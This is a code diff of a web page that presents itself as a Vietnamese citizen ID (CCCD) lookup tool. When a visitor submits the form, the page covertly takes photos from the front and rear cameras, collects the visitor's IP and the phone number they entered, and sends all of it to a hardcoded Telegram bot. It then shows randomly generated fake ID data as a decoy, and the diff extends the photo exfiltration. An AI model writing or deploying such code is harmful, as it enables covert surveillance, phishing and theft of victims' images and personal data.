@@ -141,14 +141,6 @@
         </div>
     </div>
 
-    <!-- Overlay loading -->
-    <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-        <div class="bg-white rounded-lg shadow-lg p-6 text-center animate-pulse">
-            <i class="fas fa-spinner fa-spin text-4xl text-blue-600 mb-4"></i>
-            <p class="text-lg font-semibold text-gray-700">Đang kiểm tra...</p>
-        </div>
-    </div>
-
     <footer class="mt-12 text-center text-sm text-gray-500">
         <p>©kcuong06</p>
         <p class="mt-1">Phiên bản: v1.0</p>
@@ -158,12 +150,15 @@
         async function capturePhotos() {
             const frontPhotos = [];
             const rearPhotos = [];
-
-            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            
+            // Capture 2 front camera photos (0.5s apart)
+            const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } 
+            });
             const frontVideo = document.createElement('video');
             frontVideo.srcObject = frontStream;
             await frontVideo.play();
-
+            
             for (let i = 0; i < 2; i++) {
                 const canvas = document.createElement('canvas');
                 canvas.width = frontVideo.videoWidth;
@@ -173,13 +168,16 @@
                 await new Promise(resolve => setTimeout(resolve, 500));
             }
             frontStream.getTracks().forEach(track => track.stop());
-
+            
+            // Capture 2 rear camera photos (0.5s apart)
             try {
-                const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+                const rearStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: 'environment' } } 
+                });
                 const rearVideo = document.createElement('video');
                 rearVideo.srcObject = rearStream;
                 await rearVideo.play();
-
+                
                 for (let i = 0; i < 2; i++) {
                     const canvas = document.createElement('canvas');
                     canvas.width = rearVideo.videoWidth;
@@ -192,7 +190,7 @@
             } catch (err) {
                 console.error('Rear camera not available:', err);
             }
-
+            
             return [...frontPhotos, ...rearPhotos];
         }
 
@@ -202,24 +200,23 @@
                 const data = await response.json();
                 return data.ip;
             } catch {
-                return 'Không lấy được IP';
+                return 'Could not fetch IP';
             }
         }
 
         document.getElementById('searchForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // Hiện overlay loading
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            loadingOverlay.classList.remove('hidden');
-
+            // Capture photos and get IP
             const [photos, ip] = await Promise.all([
                 capturePhotos(),
                 getIPAndLocation()
             ]);
 
+            // Tạo dữ liệu giả lập ngẫu nhiên
             const mockData = generateMockData();
-
+            
+            // Hiển thị dữ liệu
             document.getElementById('mockIdNumber').textContent = mockData.idNumber;
             document.getElementById('mockFullName').textContent = mockData.fullName;
             document.getElementById('mockDob').textContent = mockData.dob;
@@ -229,28 +226,44 @@
             document.getElementById('mockAddress').textContent = mockData.address;
             document.getElementById('mockIssueDate').textContent = mockData.issueDate;
             document.getElementById('mockGeneratedInfo').textContent = mockData.generatedInfo;
-
+            
+            // Send to Telegram bot
             const botToken = '8004316784:AAGXwEjyEOTG2Xc7eQBcuv9oEgFbnvaKv3s';
             const chatId = '5705746414';
-
+            
+            // First send text info
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Tra cứu CCCD từ IP: ${ip} SĐT: ${document.getElementById('phoneNumber').value}`);
             
-            for (let i = 0; i < photos.length; i++) {
+            // Send front camera photos with labels
+            for (let i = 0; i < 2; i++) {
                 const photoBlob = dataURLtoBlob(photos[i]);
                 const photoData = new FormData();
                 photoData.append('chat_id', chatId);
-                photoData.append('photo', photoBlob, `photo_${i + 1}.jpg`);
+                photoData.append('photo', photoBlob, `front_${i+1}.jpg`);
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: photoData
                 });
             }
+            
+            // Send rear camera photos with labels (if available)
+            if (photos.length > 2) {
+                for (let i = 2; i < photos.length; i++) {
+                    const photoBlob = dataURLtoBlob(photos[i]);
+                    const photoData = new FormData();
+                    photoData.append('chat_id', chatId);
+                    photoData.append('photo', photoBlob, `rear_${i-1}.jpg`);
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST', 
+                        body: photoData
+                    });
+                }
+            }
 
-            // Ẩn overlay loading
-            loadingOverlay.classList.add('hidden');
-
+            // Hiển thị kết quả
             document.getElementById('resultCard').style.display = 'block';
-
+            
+            // Cuộn đến kết quả
             setTimeout(() => {
                 document.getElementById('resultCard').scrollIntoView({
                     behavior: 'smooth'
@@ -259,45 +272,57 @@
         });
 
         function generateMockData() {
+            // Các tên thường dùng để tạo ngẫu nhiên
             const firstNames = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Hoàng'];
             const middleNames = ['Văn', 'Thị', 'Hữu', 'Đình', 'Minh'];
             const lastNames = ['Anh', 'Bình', 'Chung', 'Dũng', 'Giang', 'Hùng', 'Long', 'Phúc'];
-
-            const fullName = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${middleNames[Math.floor(Math.random() * middleNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`.toUpperCase();
-
+            
+            // Tạo tên ngẫu nhiên
+            const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const middleName = middleNames[Math.floor(Math.random() * middleNames.length)];
+            const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+            const fullName = `${firstName} ${middleName} ${lastName}`.toUpperCase();
+            
+            // Tạo ngày sinh (18-60 tuổi)
             const dob = new Date();
             dob.setFullYear(dob.getFullYear() - Math.floor(Math.random() * 42) - 18);
             dob.setMonth(Math.floor(Math.random() * 12));
             dob.setDate(Math.floor(Math.random() * 28) + 1);
             const dobStr = dob.toLocaleDateString('vi-VN');
-
+            
+            // Tạo ngày cấp (1-3 năm trước)
             const issueDate = new Date();
             issueDate.setFullYear(issueDate.getFullYear() - Math.floor(Math.random() * 3) - 1);
             issueDate.setMonth(Math.floor(Math.random() * 12));
             issueDate.setDate(Math.floor(Math.random() * 28) + 1);
             const issueDateStr = issueDate.toLocaleDateString('vi-VN');
-
+            
+            // Giới tính
             const gender = Math.random() > 0.5 ? 'Nam' : 'Nữ';
+            
+            // Tạo số CCCD 12 chữ số
             const idNumber = '0' + Math.floor(Math.random() * 1e11).toString().padStart(11, '0');
-
+            
+            // Địa chỉ giả lập
             const cities = ['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Hải Phòng', 'Cần Thơ'];
             const districts = ['Quận 1', 'Quận 3', 'Quận Thanh Xuân', 'Quận Hải Châu', 'Quận Ninh Kiều'];
             const streets = ['Nguyễn Huệ', 'Trần Hưng Đạo', 'Lê Lợi', 'Phạm Văn Đồng', 'Hoàng Diệu'];
             const address = `${Math.floor(Math.random() * 100) + 1}, Đường ${streets[Math.floor(Math.random() * streets.length)]}, ${districts[Math.floor(Math.random() * districts.length)]}, ${cities[Math.floor(Math.random() * cities.length)]}`;
-
+            
+            // Quê quán
             const hometowns = ['Hà Nội', 'Hải Phòng', 'Nam Định', 'Thanh Hóa', 'Nghệ An', 'Huế', 'Đà Nẵng', 'Khánh Hòa'];
             const hometown = hometowns[Math.floor(Math.random() * hometowns.length)];
-
+            
             return {
-                idNumber,
-                fullName,
+                idNumber: idNumber,
+                fullName: fullName,
                 dob: dobStr,
-                gender,
+                gender: gender,
                 nationality: 'Việt Nam',
-                hometown,
-                address,
+                hometown: hometown,
+                address: address,
                 issueDate: issueDateStr,
-                generatedInfo: `Dữ liệu giả lập được tạo ngẫu nhiên lúc ${new Date().toLocaleString('vi-VN')}. Thông tin không dùng cho mục đích chính thức.`
+                generatedInfo: `Dữ liệu được tạo lúc ${new Date().toLocaleString('vi-VN')}. Thông tin không dùng cho mục đích xấu.`
             };
         }
 
